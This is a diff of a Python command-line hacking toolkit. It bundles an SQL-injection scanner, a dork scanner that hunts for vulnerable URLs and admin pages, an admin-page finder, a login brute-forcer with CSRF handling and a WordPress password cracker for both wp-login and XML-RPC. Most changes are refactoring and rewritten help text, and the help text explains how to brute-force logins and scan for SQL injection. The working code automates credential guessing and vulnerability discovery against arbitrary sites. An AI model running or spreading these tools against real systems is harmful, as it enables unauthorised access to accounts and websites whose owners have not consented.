@@ -1,7 +1,7 @@
 #!/usr/bin/python
 import sys, os, re, io
 
-# Color [ANSI] ===============
+# Color [ANSI] ==========================================
 W = "\033[38;5;245m"
 WH = "\033[38;5;15m"
 PINK = "\033[38;5;207m"
@@ -15,6 +15,7 @@ BG = '\033[1;32m'
 BO = '\033[38;5;208m'
 BB = '\033[38;5;51m'
 
+# Set Variable ==========================================
 printout = W+"["+BO+"+"+W+"]"
 success = W+"["+BG+"+"+W+"]"
 fail = W+"["+BR+"-"+W+"]"
@@ -34,6 +35,7 @@ version = "v1.0"
 line1 = "\n\n==============================["
 line2 = "]==============================\n\n"
 
+# Get Terminal Width ==========================================
 term_size = os.get_terminal_size()
 whitespace = ""
 
@@ -42,6 +44,7 @@ for xx in range(term_size.columns):
   
 whitespace = whitespace
 
+# Check Python Version ==========================================
 try:
   import platform
 except ImportError as sp:
@@ -55,6 +58,7 @@ if sys.version[0] in '2':
    else:
      exit()
 
+# Cleaning Temp ==========================================
 print(f"{systm}{BG} Cleaning Temp Folder...\n")
 try:
   if os.path.exists("./install.sh"):
@@ -67,7 +71,7 @@ if os.path.exists("./.temp"):
     if os.path.exists(os.path.join("./.temp", i)):
       os.remove(os.path.join("./.temp", i))
 
-#Setup =====================================
+#Setup Folder & Resource =====================================
 if not os.path.exists("./output"):
     os.makedirs("./output")
 
@@ -131,6 +135,8 @@ if not os.path.exists("./output/nslookup"):
 if not os.path.exists("./output/revIP"):
     os.makedirs("./output/revIP")
 
+
+# Checking PIP Packages ==========================================
 try:
   print(f"{loading}{BO} Checking Packages ...")
   import mechanicalsoup, blessed, lxml, threading, subprocess, http.client as httplib, urllib.parse, httplib2, socket, os.path, ipaddress, ipdetector, collections, datetime, requests, random, json, time, uuid
@@ -302,6 +308,8 @@ except ImportError as chk:
   from datetime import datetime
   from blessed import Terminal
 
+
+# Check Device OS ==========================================
 osdevice = {'Win','Win98','WinNT3','WinNT4','Windows','WindowsCE'}
 
 if platform.system() in osdevice:
@@ -313,7 +321,7 @@ else:
 
 time.sleep(0.750)
 
-#Public =====================================
+# Banner =====================================
 os.system(clrcmd)
 banner = f"""\033[38;5;208m
      │_________________________
@@ -327,6 +335,7 @@ banner = f"""\033[38;5;208m
    \033[38;5;208mGithub: {git}{W}
 +──────────────────────────────────────────────+"""
 
+# Check Connection ==========================================
 def checkConnection(url,option):
   sys.stdout.write(f"\n{loading}{BO} Checking Connecting to {BB}{url}")
   time.sleep(0.5)
@@ -360,6 +369,7 @@ def checkConnection(url,option):
       sys.stdout.write(f"\r{error}{BR} Connection Error, Maybe Your Internet Connection or Website Down!")
       pass
 
+# Remove Duplicates Text Output ==========================================
 def removeDups(inputfile):
     tmp = "./.temp/"
     filename = inputfile
@@ -372,6 +382,7 @@ def removeDups(inputfile):
         out.write(line)
     os.remove(tmp + inputfile + "_old")
 
+# Saving File ==========================================
 def save_file(name, content, mode):
   if mode == 1:
     if os.path.exists(name):
@@ -511,9 +522,7 @@ class sqlscan():
       print(banner)
       print(f"{W}[{BR}@{W}]{BG} SQLI Scanner {W}")
       if (mode == 1):
-        print(f" ├─[{PINK}e.g: website.com/index.php?id=1{W}]")
-        print(f"{W} │")
-        scan = str(input(f" └─[{BO}Url{W}]{P} "))
+        scan = str(input(f" └─[{BO}Target{W}]{P} "))
 
         n_url = urlparse(scan).hostname
         checkConnection(scan,1)
@@ -595,13 +604,11 @@ Error: {err}\n\n"""
 
       elif (mode == 2):
         filetemp = str(uuid.uuid4())
-        print(f" ├─[{PINK}Path e.g: lists.txt{W}]─[{PINK}Output e.g: vuln.txt{W}]")
-        print(f"{W} │")
-        path = str(input(f" ├─[{BO}Path{W}]{P} "))
+        path = str(input(f" ├─[{BO}Path File{W}]{P} "))
         if not os.path.exists(path):
           input(f"{error}{BR} File Does Not Exists!")
           self.main(mode)
-        output = str(input(f"{W} └─[{BO}Output{W}]{P} "))
+        output = str(input(f"{W} └─[{BO}Output File{W}]{P} "))
 
         with open(path, 'r') as f:
           sqllists = f.read().splitlines()
@@ -729,65 +736,49 @@ class SUB():
     except requests.exceptions.ConnectionError:
       pass
 
-  def sub_func(self,mode):
+  def main(self):
     try:
       os.system(clrcmd)
       print(banner)
       print(f"{W}[{BR}@{W}]{BG} Subdomain Scanner {W}")
 
-      if (mode == 1):
-        filetemp = str(uuid.uuid4())
-        print(f" ├─[{PINK}e.g: https://www.google.com{W}]")
-        print(f"{W} │")
-        s_url = str(
-          input(f" └─[{BO}Url{W}]{P} "))
-        if "http://" in s_url or "https://" in s_url:
-          n_url = urlparse(s_url).hostname
-          s_url = n_url
-          s_url = str(s_url)
-        else:
-          n_url = s_url
-          s_url = s_url
+      filetemp = str(uuid.uuid4())
+      s_url = str(
+        input(f" └─[{BO}Url{W}]{P} "))
+      if "http://" in s_url or "https://" in s_url:
+        n_url = urlparse(s_url).hostname
+        s_url = n_url
+        s_url = str(s_url)
+      else:
+        n_url = s_url
+        s_url = s_url
         
-        checkConnection("http://"+n_url,1)
+      checkConnection("http://"+n_url,1)
 
-        try:
-          subdomains = []
-          with open("./src/subdomains.txt", 'r') as file:
-            try:
-              for line in file:
-                word = line.strip()
-                test_url = word + "." + s_url
-                response = self.request(test_url)
-                subdomains.append("https://" + test_url)
-                test_url = 'https://' + test_url
+      try:
+        subdomains = []
+        with open("./src/subdomains.txt", 'r') as file:
+          try:
+            for line in file:
+              word = line.strip()
+              test_url = word + "." + s_url
+              response = self.request(test_url)
+              subdomains.append("https://" + test_url)
+              test_url = 'https://' + test_url
 
+              sys.stdout.write("\r" + whitespace)
+              sys.stdout.write(f"\r{loading}{BO} CHECKING: {test_url}")
+              time.sleep(0.02)
+
+              if response:
                 sys.stdout.write("\r" + whitespace)
-                sys.stdout.write(f"\r{loading}{BO} CHECKING: {test_url}")
-                time.sleep(0.02)
+                sys.stdout.write(f"\r{success}{BG} FOUND: {test_url}\n")
+                text = "Url: {}\n".format(test_url)
+                temp = open("./.temp/" + filetemp, "a+")
+                temp.writelines(text)
+                temp.close()
 
-                if response:
-                  sys.stdout.write("\r" + whitespace)
-                  sys.stdout.write(f"\r{success}{BG} FOUND: {test_url}\n")
-                  text = "Url: {}\n".format(test_url)
-                  temp = open("./.temp/" + filetemp, "a+")
-                  temp.writelines(text)
-                  temp.close()
-
-            except KeyboardInterrupt:
-              if os.path.exists("./.temp/" + filetemp):
-                removeDups(filetemp)
-                c = open("./.temp/" + filetemp, "r")
-                name = "./output/subscan/" + n_url + ".txt"
-                content = c.read()
-                c.close()
-                os.remove("./.temp/" + filetemp)
-                save_file(name, content, 1)
-              else:
-                input(f"\n{fail}{BO} Nothing is Saved!")
-                main()
-              main()
-
+          except KeyboardInterrupt:
             if os.path.exists("./.temp/" + filetemp):
               removeDups(filetemp)
               c = open("./.temp/" + filetemp, "r")
@@ -795,13 +786,26 @@ class SUB():
               content = c.read()
               c.close()
               os.remove("./.temp/" + filetemp)
-              save_file(name, content, 2)
+              save_file(name, content, 1)
             else:
               input(f"\n{fail}{BO} Nothing is Saved!")
               main()
-          main()
-        except requests.exceptions.ConnectionError:
-          print("\n"+ ercon + R +
+            main()
+
+          if os.path.exists("./.temp/" + filetemp):
+            removeDups(filetemp)
+            c = open("./.temp/" + filetemp, "r")
+            name = "./output/subscan/" + n_url + ".txt"
+            content = c.read()
+            c.close()
+            os.remove("./.temp/" + filetemp)
+            save_file(name, content, 2)
+          else:
+            input(f"\n{fail}{BO} Nothing is Saved!")
+            main()
+        main()
+      except requests.exceptions.ConnectionError:
+        print("\n"+ ercon + R +
                 " " + test_url)
     except KeyboardInterrupt:
       cancel()
@@ -957,8 +961,7 @@ class dorkscan():
       os.system(clrcmd)
       print(banner)
       print(f"{W}[{BR}@{W}]{BG} Dork Scanner{W}")
-      print(f" ├─[{PINK}Dork e.g: inurl:view.php?id={W}]─[{PINK}Proxy e.g: 127.0.0.1:1337{W}]")
-      print(f" ├─[{PINK}Add -s for Scan e.g: dork -s{W}]")
+      print(f" ├─[{PINK}Add -s for Scan{W}]")
       print(f"{W} │")
       dorks = str(input(f"{W} ├─[{O}Dork{W}]{P} "))
       proxy = str(input(f"{W} └─[{O}Proxy{W}]{P} "))
@@ -1030,6 +1033,7 @@ class dorkscan():
                                   save_file(name, content, 5)
                                   print(f"{success}{BG} Login Page Saved In:{P}{name}\n\n")
                                   break
+                                time.sleep(0.005)
 
                               for err in sqlerror:
                                 sys.stdout.write(f"\r{whitespace}")
@@ -1239,6 +1243,7 @@ Error: {err}\n\n"""
                 for url in list(set(urls)):
                   try:
                     adm = 0
+                    nml = 0
                     for adm in admfound:
                       if adm in url:
                         print(loginfound+P+' {}'.format(url))
@@ -1247,14 +1252,18 @@ Error: {err}\n\n"""
                         temp.writelines(text)
                         temp.close()
                         adm = 1
+                        nml = 1
                         break
-                      else:
-                        print(printout+BO+' {}'.format(url))
-                        text = "{}\n".format(url)
-                        temp = open("./.temp/" + filetemp, "a+")
-                        temp.writelines(text)
-                        temp.close()
-                        break
+                      time.sleep(0.005)
+
+                    if nml == 0:
+                      print(printout+BO+' {}'.format(url))
+                      text = "{}\n".format(url)
+                      temp = open("./.temp/" + filetemp, "a+")
+                      temp.writelines(text)
+                      temp.close()
+                      break
+
 
                   except KeyboardInterrupt:
                     if os.path.exists("./.temp/" + filetemp):
@@ -1331,8 +1340,6 @@ class crawler():
         if (mode == 1):
           filetemp = str(uuid.uuid4())
           filetemp2 = str(uuid.uuid4())
-          print(f" ├─[{PINK}e.g: https://www.google.com{W}]")
-          print(f"{W} │")
           s_url = str(
             input(f" └─[{BO}Url{W}]{P} "))
           if "http://" in s_url or "https://" in s_url:
@@ -1499,89 +1506,75 @@ class crawler():
 #Admin Finder =====================================
 class ADMF():
 
-  def admf_func(self,mode):
+  def main(self):
     try:
       print(banner)
       print(f"{W}[{BR}@{W}]{BG} Admin Finder {W}")
-
-      if (mode == 1):
-        filetemp = str(uuid.uuid4())
-        print(f" ├─[{PINK}e.g: https://www.google.com{W}]")
-        print(f"{W} │")
-        s_url = str(
-          input(f" └─[{BO}Url{W}]{P} "))
-        if "http://" in s_url or "https://" in s_url:
-          s_url = s_url
-          n_url = urlparse(s_url).hostname
-        else:
-          n_url = s_url
-          s_url = "http://" + s_url
+      filetemp = str(uuid.uuid4())
+      s_url = str(
+        input(f" └─[{BO}Url{W}]{P} "))
+      if "http://" in s_url or "https://" in s_url:
+        s_url = s_url
+        n_url = urlparse(s_url).hostname
+      else:
+        n_url = s_url
+        s_url = "http://" + s_url
         
-        checkConnection("http://"+n_url,1)
+      checkConnection("http://"+n_url,1)
 
-        with open('./src/adminpages.txt', 'r') as f:
-          adminpages = f.read().splitlines()
-        print("\n")
-        for adminpage in adminpages:
+      with open('./src/adminpages.txt', 'r') as f:
+        adminpages = f.read().splitlines()
+      print("\n")
+      for adminpage in adminpages:
+        try:
           try:
-            try:
-              response = requests.get(s_url + "/" + adminpage)
-              if 'admin' in response.text or 'login' in response.text:
-                sys.stdout.write("\r" + whitespace)
-                sys.stdout.write(f"\r{loginfound}{BG} {s_url}/{adminpage}\n")
-                text = "Url: {}\n".format(s_url + "/" + adminpage)
-                temp = open("./.temp/" + filetemp, "a+")
-                temp.writelines(text)
-                temp.close()
-              else:
-                sys.stdout.write("\r" + whitespace)
-                sys.stdout.write("\r"+ notfound + R +
-                                 " " + s_url + "/" + adminpage)
-            except requests.exceptions.ConnectionError:
-              print(f"\n{ercon}{R} {s_url}/{adminpage}\n")
-          except KeyboardInterrupt:
-            if os.path.exists("./.temp/" + filetemp):
-              removeDups(filetemp)
-              c = open("./.temp/" + filetemp, "r")
-              name = "./output/adminfind/" + n_url + ".txt"
-              content = c.read()
-              c.close()
-              os.remove("./.temp/" + filetemp)
-              save_file(name, content, 1)
+            response = requests.get(s_url + "/" + adminpage)
+            if 'admin' in response.text or 'login' in response.text:
+              sys.stdout.write("\r" + whitespace)
+              sys.stdout.write(f"\r{loginfound}{BG} {s_url}/{adminpage}\n")
+              text = "Url: {}\n".format(s_url + "/" + adminpage)
+              temp = open("./.temp/" + filetemp, "a+")
+              temp.writelines(text)
+              temp.close()
             else:
-              input(f"\n{fail}{BO} Nothing is Saved!")
-              main()
+              sys.stdout.write("\r" + whitespace)
+              sys.stdout.write("\r"+ notfound + R +
+                                 " " + s_url + "/" + adminpage)
+          except requests.exceptions.ConnectionError:
+            print(f"\n{ercon}{R} {s_url}/{adminpage}\n")
+        except KeyboardInterrupt:
+          if os.path.exists("./.temp/" + filetemp):
+            removeDups(filetemp)
+            c = open("./.temp/" + filetemp, "r")
+            name = "./output/adminfind/" + n_url + ".txt"
+            content = c.read()
+            c.close()
+            os.remove("./.temp/" + filetemp)
+            save_file(name, content, 1)
+          else:
+            input(f"\n{fail}{BO} Nothing is Saved!")
             main()
-          time.sleep(0.05)
-
-        if os.path.exists("./.temp/" + filetemp):
-          removeDups(filetemp)
-          c = open("./.temp/" + filetemp, "r")
-          name = "./output/adminfind/" + n_url + ".txt"
-          content = c.read()
-          c.close()
-          os.remove("./.temp/" + filetemp)
-          save_file(name, content, 1)
-        else:
-          input(f"\n{fail}{BO} Nothing is Saved!")
           main()
+        time.sleep(0.05)
+
+      if os.path.exists("./.temp/" + filetemp):
+        removeDups(filetemp)
+        c = open("./.temp/" + filetemp, "r")
+        name = "./output/adminfind/" + n_url + ".txt"
+        content = c.read()
+        c.close()
+        os.remove("./.temp/" + filetemp)
+        save_file(name, content, 1)
+      else:
+        input(f"\n{fail}{BO} Nothing is Saved!")
         main()
+      main()
 
     except KeyboardInterrupt:
       cancel()
 
 
 #Login Brute =====================================
-def open_ressources(file_path):
-  return [item.replace("\n", "") for item in open(file_path).readlines()]
-
-
-INCORRECT_MESSAGE = open_ressources('./src/brute/incorrectMessage.txt')
-SUCCESS_MESSAGE = open_ressources('./src/brute/successMessage.txt')
-PASSWORDS = open_ressources('./src/passwords.txt')
-USERS = open_ressources('./src/brute/users.txt')
-LIMIT_TRYING_ACCESSING_URL = 7
-
 class LOG():
 
   def main(self):
@@ -1590,10 +1583,9 @@ class LOG():
       os.system(clrcmd)
       print(banner)
       print(f"{W}[{BR}@{W}]{BG} Login Brute{W}")
-      print(f" ├─[{PINK}Target e.g: http://site.com/login/{W}]")
-      print(f" ├─[{PINK}Add -csrf = enable csrf-token]")
+      print(f" ├─[{PINK}Add -csrf for enable csrf-token]")
       print(f"{W} │")
-      _input = input(f" └─[{BO}~>{W}]{P} ")
+      _input = input(f" └─[{BO}Target{W}]{P} ")
       _input = _input.replace(" ", "" )
 
       if "-csrf" in _input:
@@ -1704,7 +1696,7 @@ class LOG():
                 print(whitespace)
             with term.location(x=0, y=28):
                 print(whitespace)
-            print(f"\n{found}{BO}\nUrl: {P}{url}{BO}\nUsername: {BG}{user}{BO}\nPassword: {BG}{pwd}")
+            print(f"\n{found}{BG} Login User Found!{BO}\nUrl: {P}{url}{BO}\nUsername: {BG}{user}{BO}\nPassword: {BG}{pwd}")
 
             content = f"Url: {url}\nUsername: {user}\nPassword: {pwd}\n"
             name = "./output/logbrute/" + n_url + ".txt"
@@ -1824,6 +1816,7 @@ class WP():
               text = "Url: {}\nUsername: {}\nPassword: {}\n".format(url, user, password)
               name = "./output/wpbrute/" + n_url + ".txt"
               save_file(name, text, 1)
+              main()
 
            checkCon = "OK"
            return checkCon
@@ -1838,10 +1831,11 @@ class WP():
            xmlcontent = content.decode().replace(" ", "").replace("\n","")
 
            if not "faultCode" in xmlcontent:
-              print(f"\n{found}{BG}Password FOUND!!!{BO}\nUsername: {BG}{user}{BO}\nPassword: {BG}{password}")
+              print(f"\n{found}{BG} Login User Found!{BO}\nUsername: {BG}{user}{BO}\nPassword: {BG}{password}")
               text = "Url: {}\nUsername: {}\nPassword: {}\n".format(url, user, password)
               name = "./output/wpbrute/" + n_url + ".txt"
               save_file(name, text, 1)
+              main()
 
            checkCon = "OK"
            return checkCon
@@ -1876,10 +1870,9 @@ class WP():
       os.system(clrcmd)
       print(banner)
       print(f"{W}[{BR}@{W}]{BG} WordPress Crack {W}")
-      print(f" ├─[{PINK}Target e.g: http://site.com/wp-login.php{W}]")
-      print(f" ├─[{PINK}Mode -1 = standard, -2 = xml-rpc | e.g: target -1]{W}]")
+      print(f" ├─[{PINK}Mode -1 = standard, -2 = xml-rpc{W}]")
       print(f"{W} │")
-      _input = input(f" └─[{BO}~>{W}]{P} ")
+      _input = input(f" └─[{BO}Target{W}]{P} ")
       _input = _input.replace(" ", "" )
 
       if "-1" in _input:
@@ -1921,7 +1914,12 @@ class WP():
           wlfile = wlfile
 
       timeout = input(f"{W} └─[{BO}Response Timeout{W}]{P} ")
-      timeout = int(timeout)
+      if timeout.isspace() or "" in timeout:
+        timeout = 3
+        timeout = int(timeout)
+      else:
+        timeout = int(timeout)
+      
       if opt == 1:
         brtmd="std"
       else:
@@ -1940,10 +1938,10 @@ class WP():
         totalwordlist="unknown"
 
       print(f"\n{success}{BB} Target.....: {url}")
-      print(success+BB+' Wordlist...: '+str(totalwordlist)+" ["+wlfile+"]")
-      print(f"\n{success}{BB} Username...: {user}")
-      print(f"\n{success}{BB} BruteMode..: {mode}")
-      print(f"\n{success}{BB} Connecting.......")
+      print(f"{success}{BB} Wordlist.....: {BO}{str(totalwordlist)} [{wlfile}]")
+      print(f"{success}{BB} Username...: {user}")
+      print(f"{success}{BB} BruteMode..: {mode}")
+      print(f"{success}{BB} Connecting.......")
 
       if self.connection(url,user,Ua,Ua,timeout,brtmd) == "OK":
         print(f"\n{success}{BB} Connection Established!")
@@ -2002,8 +2000,6 @@ class nslookup():
           "NSEC3PARAM", "PTR", "RP", "RRSIG", "RT", "SOA", "SRV", "TLSA",
           "TXT", "X25"
         ]
-        print(f" ├─[{PINK}e.g: https://www.google.com{W}]")
-        print(f"{W} │")
         f_url = str(input(f" └─[{BO}Url{W}]{P} "))
 
         if "http://" in f_url or "https://" in f_url:
@@ -2115,10 +2111,9 @@ class REVIP():
             os.system(clrcmd)
             print(banner)
             print(f"{W}[{BR}@{W}]{BG} Reverse IP Lookup {W}") 
-            print(f" ├─[{PINK}Domain e.g: google.com{W}]─[{PINK}IP e.g: 192.168.1.1{W}]─[{PINK}File e.g: lists.txt{W}]")
-            print(f" ├─[{PINK}Required -dom = Domain, -ip = IP Address, -f = File | e.g: google.com -dom{W}]")
+            print(f" ├─[{PINK}Required -dom = Domain, -ip = IP Address, -f = File{W}]")
             print(f"{W} │")
-            inpt = input(f" └─[{BO}~>{W}]{P} ")
+            inpt = input(f" └─[{BO}Target{W}]{P} ")
 
             if "-dom" in inpt:
               inpts = inpt.replace("-dom", "" )
@@ -2251,7 +2246,7 @@ class REVIP():
               main()
             main()
             
-#Mode =====================================
+# Select Mode =====================================
 class mode():
 
   def slc(self, tools , name):
@@ -2297,7 +2292,7 @@ class mode():
       cancel()
 
 
-#Main =====================================
+# Main Menu =====================================
 def main():
   try:
     time_stamp = time.time()
@@ -2332,7 +2327,7 @@ def main():
         break
       elif (i == '2' or i == '02'):
         os.system(clrcmd)
-        SUB().sub_func(1)
+        SUB().main()
         break
       elif (i == '3' or i == '03'):
         os.system(clrcmd)
@@ -2344,7 +2339,7 @@ def main():
         break
       elif (i == '5' or i == '05'):
         os.system(clrcmd)
-        ADMF().admf_func(1)
+        ADMF().main()
         break
       elif (i == '6' or i == '06'):
         os.system(clrcmd)
@@ -2366,7 +2361,7 @@ def main():
         os.system(clrcmd)
         helps()
         break
-      elif (i == '0' or i == '00' or i == 'x'):
+      elif (i == '0' or i == '00' or i == 'x' or i == 'X'):
         exit()
       else:
         input(invalid)
@@ -2375,6 +2370,7 @@ def main():
   except KeyboardInterrupt:
     exit()
 
+# Help Screen ==========================================
 def helps():
     os.system(clrcmd)
     print(banner)
@@ -2384,8 +2380,8 @@ def helps():
 {systm}{W}─────────────{BG}[Scanner Tools]{W}──────────────{systm}
 
 {success}{PINK} SQLI Scanner:
-    {W}Tools For Scanning SQL Vulnerability in website automaticly,
-    and support scan website in list file (txt or other)
+    {W}A tool for scanning SQL vulnerabilities in websites automatically.
+    It supports scanning websites from a list file in the format of .txt or others.
 
   {printout}{BO} Usage:
       {B}[Single Target] 
@@ -2393,30 +2389,26 @@ def helps():
       url > http://vulnwebsite.net/pages.php?id=1
 
       {G}[Multi Target] 
-      {W}Input your list text file that contains url for scanning,
-      and enter output file name
+      {W}Input a text file containing a list of URLs for scanning, and enter an output file name.
 
       {WH}Example: 
       path > path/to/file/list.txt or lists.txt
       output > path/to/file/output.txt or output.txt
 
 {success}{PINK} Subdomain Scanner:
-    {W}Tools For Scanning Subdomain Website, that hidden
-    or cannot see in search view or not public by owner
+    {W}A tool for scanning subdomains that are hidden or not publicly visible to search engines.
 
   {printout}{BO} Usage:
       {WH}Example: 
       url > http://www.website.net
 
 {success}{PINK} Dork Scanner:
-    {W}Tools For Scanning Dork like inurl, intext, intitle, and other,
-    this tool can also scan Dork that contain Sql Vulnerability,
-    and can detect url, that contain admin login, and you can
-    also set custom proxy for searching Dork
+    {W}A tool for scanning dorks using inurl, intext, intitle, and others.
+    This tool can also scan for dorks that contain SQL vulnerabilities, detect URLs that contain admin login, and allows for the setting of a custom proxy for searching dorks.
 
   {printout}{BO} Usage:
-      {B}For scanning sql vulnerability
-      you can add {P}-s {B}in dork input
+      {B}To scan for SQL vulnerabilities:
+      add {P}-s {B}in the dork input.
 
       {WH}Example: (Sql vuln not scanned)
       dork > inurl:view.php?id=
@@ -2431,10 +2423,8 @@ def helps():
       proxy > 127.0.0.1:1337
 
 {success}{PINK} Web Crawler:
-    {W}Tools For Scanning url in specific website, or 
-    crawling url in specific website, and also support
-    scan website in list file (txt or other), and can
-    detect url, that contain admin login
+    {W}A tool for scanning and crawling URLs within a specific website.
+    Supports scanning websites in a list file (txt or other) and can detect URLs that contain an admin login page.
 
   {printout}{BO} Usage:
       {B}[Single Target] 
@@ -2442,15 +2432,13 @@ def helps():
       url > http://webhost.com
 
       {G}[Multi Target] 
-      {W}Input your list text file that contains url for scanning
+      {W}Input your list text file that contains URLs for scanning.
 
       {WH}Example: 
       path > path/to/file/list.txt or lists.txt
 
 {success}{PINK} Admin Finder:
-    {W}This Tools like subdomain scanner, but this is for scanning
-    admin login page, that hidden or cannot see in search view,
-    or not public by website owner
+    {W}A tool similar to a subdomain scanner but designed for scanning admin login pages that are hidden or not publicly accessible by the website owner.
 
   {printout}{BO} Usage:
       {WH}Example: 
@@ -2460,21 +2448,14 @@ def helps():
 {systm}{W}───────────{BG}[Brute Force Tools]{W}────────────{systm}
 
 {success}{PINK} Login Brute:
-    {W}This Tools For Brute Force login website, you can also
-    Brute Force login website that contain CSRF Token,
-    and you can also choose Password Wordlist, or you
-    can Leave Blank, if you want to use default
-    Password Wordlist [src/passwords.txt]
+    {W}This is a Brute Force Login Tool. You can use it to brute force login websites, even those that use a CSRF token.
+    You have the option to choose a custom password wordlist or use the default wordlist located at (src/passwords.txt).
 
-  {error} This Tools Required Specific {P}<'action'> Attribute
-      like /check_login.php, <'name'> Attribute for username-field,
-      <'name'> Attribute for password-field, and <'name'>
-      Attribute for csrf token if you use csrf token,{W}
-      that contain in html form, you can view it
-      with Inspect Element
+  {error} This tool requires specific {P}<'action'> attribute information, such as the URL for the login form's check_login.php, as well as the <'name'> attributes for the username, password, and csrf token fields.
+  {W}These can be found by using the browser's inspect element tool.
 
   {printout}{BO} Usage:
-      {B}For enable CSRF mode you can add {P}-csrf {B}in input
+      {B}To enable CSRF mode, add the option {P}-csrf {B}to the input.
       
       {WH}Example: (Without CSRF Token)
       ~> http://site.com/login/
@@ -2491,12 +2472,74 @@ def helps():
       pass field > upass
       csrf token > csrf
 
+{success}{PINK} WordPress Crack:
+    {W}This tool is for brute-forcing WordPress login pages and XML-RPC in WordPress.
+    You have the option to select a password wordlist or use the default one [src/passwords.txt].
+    You can also set the response timeout, which is set to 3 seconds by default.
 
-"""
+  {printout}{BO} Usage:
+      {B}This tool requires a mode to be selected.
+      To choose standard mode, enter {P}-1.{W}
+      To choose XML-RPC mode, enter {P}-2.{W}
+      
+      {WH}Example: (Standard Mode)
+      ~> http://wordpress.com/wp-login.php -1
+      username > admin
+      wordlist > src/passwords.txt
+      timeout > 5
+
+      {WH}Example: (Xml-Rpc Mode)
+      ~> http://wordpress.com/xmlrpc.php -2
+      username > admin
+      wordlist > src/passwords.txt
+      timeout > 5
+
+
+{systm}{W}───────────{BG}[Network Tools]{W}────────────{systm}
+
+{success}{PINK} NSLookup:
+    {W}This tool is used to scan network information of a website, such as IP address, DNS, and others, with various types of scans.
+    It also supports scanning multiple websites using a list file in formats such as .txt.
+
+  {printout}{BO} Usage:
+      {B}[Single Target] 
+      {WH}Example: 
+      url > www.google.com
+
+      {G}[Multi Target] 
+      {W}Enter the path to your list file that contains the URLs to be scanned.
+
+      {WH}Example: 
+      path > path/to/file/list.txt or lists.txt
+
+{success}{PINK} Reverse IP:
+    {W}This tool scans records of websites linked to a specific website.
+    It also supports scanning multiple websites using a list file in formats such as .txt.
+
+  {printout}{BO} Usage:
+      {B}This tool requires a type selection.
+      You can choose between {P}-dom {B} for domain type,
+      {P}-ip {B} for IP address type, or {P}-file {B}
+      if you want to use a list file such as a .txt file.
+      
+      {WH}Example: (Domain Type)
+      ~> www.google.com -dom
+
+      {WH}Example: (IP Address Type)
+      ~> 192.168.1.1 -ip
+
+      {WH}Example: (List File Type)
+      ~> path/to/file/list.txt or lists.txt -file
+
+
+{systm}{W}─────────────────────────────────────────────{systm}
+{PINK}              Press Enter To Go Back\033[38;5;232m"""
     input(help_text)
+    print(W)
     main()
     
 
+# Other ==========================================
 def cancel():
   sys.stdout.write("\n\r" + whitespace)
   sys.stdout.write(f"\r{W}[{BR}\\{W}] {BO}Back{W} To Menu [{BR}3{W}]")
@@ -2512,7 +2555,7 @@ def cancel():
 def exit():
   os.system(clrcmd)
   print(banner)
-  print(W + "[" + BR + "$" + W + "]" + O + " See You Again!\n\n")
+  print(f"{systm}{BO} See You Again!\n\n")
   sys.exit()
 
 if __name__ == '__main__':                                          
